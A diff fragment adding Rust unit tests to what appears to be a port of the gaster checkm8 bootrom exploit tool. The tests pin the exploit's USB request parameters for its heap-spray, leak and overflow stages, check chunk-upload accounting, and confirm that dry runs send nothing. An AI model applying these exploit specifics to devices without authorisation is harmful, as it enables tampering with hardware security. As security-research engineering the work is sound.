+            transferred: 0x40,
+            ..base.clone()
+        }));
+
+        // The refused shape: never submitted, so no abort window and no time.
+        let refused = XferResult {
+            status: XferStatus::Error,
+            micros: 0,
+            abort_after_ms: None,
+            ..base.clone()
+        };
+        assert!(
+            abort_completed(&refused),
+            "the old predicate called this completed"
+        );
+        assert!(
+            !leak_satisfied(&refused),
+            "and this is why SPRAY could pass on a dead handle"
+        );
+
+        // A device that is gone is not a measurement either.
+        assert!(!leak_satisfied(&XferResult {
+            status: XferStatus::NoDevice,
+            ..base.clone()
+        }));
+
+        // A reaped ERROR that moved zero bytes still satisfies it: gaster's
+        // wrapper counts every terminal status as completed (`gaster.c:220-223`).
+        let reaped_error = XferResult {
+            status: XferStatus::Error,
+            micros: 4012,
+            abort_after_ms: Some(1),
+            ..base
+        };
+        assert!(leak_satisfied(&reaped_error));
+    }
+
+    /// A chunk counts as complete only when the device acknowledged every byte.
+    /// This is the *recording* decision, not the stage's decision: gaster's chunk
+    /// loop cannot fail (`gaster.c:226-240`, `:1213-1216`), so `stage_patch`
+    /// records a short chunk and continues. The continue-instead-of-abort control
+    /// flow needs a `Transport` and is inspection-pinned — see the honest-limit
+    /// note on `stage_patch`.
+    #[test]
+    fn a_short_upload_chunk_is_recognised_but_never_stops_the_stage() {
+        let mk = |status: XferStatus, transferred: usize| XferResult {
+            seq: 1,
+            bm_request_type: 0x21,
+            b_request: DFU_DNLOAD,
+            w_value: 0,
+            w_index: 0,
+            w_length: 528,
+            status,
+            transferred,
+            requested: 528,
+            micros: 12_000,
+            libusb_rc: -7,
+            abort_after_ms: None,
+        };
+        assert!(patch_chunk_complete(&mk(XferStatus::Ok, 528), 528));
+        assert!(!patch_chunk_complete(&mk(XferStatus::Ok, 0), 528));
+        assert!(
+            !patch_chunk_complete(&mk(XferStatus::Timeout, 0), 528),
+            "the live run's third attempt: chunk 0 TIMEOUT 0/528"
+        );
+        assert!(!patch_chunk_complete(&mk(XferStatus::Stall, 0), 528));
+    }
+
+    /// The `patch_uploaded` line must make a short chunk visible rather than
+    /// rounding it into a clean `uploaded=N` reading.
+    #[test]
+    fn the_patch_upload_summary_makes_a_short_chunk_visible() {
+        let clean = patch_upload_summary(528, 528, 0, "c4fb5fd4", true);
+        assert!(clean.contains("attempted=528"), "{clean}");
+        assert!(clean.contains("acknowledged=528"), "{clean}");
+        assert!(clean.contains("short_or_failed_chunks=0"), "{clean}");
+        assert!(clean.contains("manifest_walk_completed=true"), "{clean}");
+        assert!(!clean.contains("PATCH_UPLOAD_SHORT"), "{clean}");
+
+        let short = patch_upload_summary(528, 0, 1, "c4fb5fd4", false);
+        assert!(short.contains("acknowledged=0"), "{short}");
+        assert!(short.contains("short_or_failed_chunks=1"), "{short}");
+        assert!(short.contains("manifest_walk_completed=false"), "{short}");
+        assert!(short.contains("PATCH_UPLOAD_SHORT"), "{short}");
+        assert!(short.contains("continued"), "{short}");
+    }
+
+    /// B4: the wire parameters that were previously "pinned by inspection only" —
+    /// PATCH's `wIndex = 0x80` (HANDOFF §8.5's bug class), SPRAY's `wIndex`,
+    /// `wValue` shape and the `0x40`/`0xC1` lengths, and the CLR_STATUS length.
+    #[test]
+    fn the_wire_parameters_are_pinned_by_construction() {
+        let s = spray_stall_req();
+        assert_eq!((s.bm, s.b, s.value, s.index, s.length), (2, 3, 0, 0x80, 0));
+
+        let o = patch_overflow_req(OVERWRITE_STRUCT_SIZE as u16);
+        assert_eq!((o.bm, o.b, o.value, o.index, o.length), (2, 3, 0, 0x80, 48));
+        assert_eq!(
+            o.index, 0x80,
+            "gaster.c:1211 — a hardcoded 0 here was a real bug (HANDOFF §8.5)"
+        );
+
+        let l = spray_leak_req(0x0304, LEAK_WINDEX_GASTER);
+        assert_eq!(
+            (l.bm, l.b, l.value, l.index, l.length),
+            (0x80, 6, 0x0304, LEAK_WINDEX_GASTER, EP0_MAX_PACKET_SZ)
+        );
+        let n = spray_no_leak_req(0x0304, LEAK_WINDEX_GASTER);
+        assert_eq!(n.length, 3 * EP0_MAX_PACKET_SZ + 1);
+        assert_eq!(n.length, 0xC1, "gaster.c:886 is 0xC1, not ipwndfu's 0x41");
+        assert_eq!((n.bm, n.b, n.value, n.index), (l.bm, l.b, l.value, l.index));
+
+        let c = spray_clr_status_req();
+        assert_eq!(
+            (c.bm, c.b, c.value, c.index, c.length),
+            (0x21, DFU_CLRSTATUS, 0, 0, 0xC1)
+        );
+    }
+
+    // -- the single-writer entry points ------------------------------------
+
+    /// The additive API the Lead asked for: `run_with_tracer` drives the same
+    /// paths as `run`, against a caller-owned tracer — and a dry run still opens
+    /// nothing, sends nothing and writes no trace line.
+    #[test]
+    fn run_with_tracer_drives_the_same_paths_as_run() {
+        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
+        let outcome = run_with_tracer(
+            RunOptions {
+                dry_run: true,
+                ..RunOptions::default()
+            },
+            &mut t,
+        );
+        match outcome {
+            RunOutcome::Aborted(m) => assert!(m.contains("dry_run: built"), "{m}"),
+            other => panic!("{other:?}"),
+        }
+        assert_eq!(t.counters().total(), 0, "a dry run writes no trace line");
+
+        // …and the stage-filter branch of the same entry point.
+        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
+        let outcome = run_with_tracer(
+            RunOptions {
+                dry_run: true,
+                stage_filter: Some(Stage::Setup),
+                ..RunOptions::default()
+            },
+            &mut t,
+        );
+        match outcome {
+            RunOutcome::Aborted(m) => assert!(m.contains("nothing was sent"), "{m}"),
+            other => panic!("{other:?}"),
+        }
+        assert_eq!(t.counters().total(), 0);
     }
 }
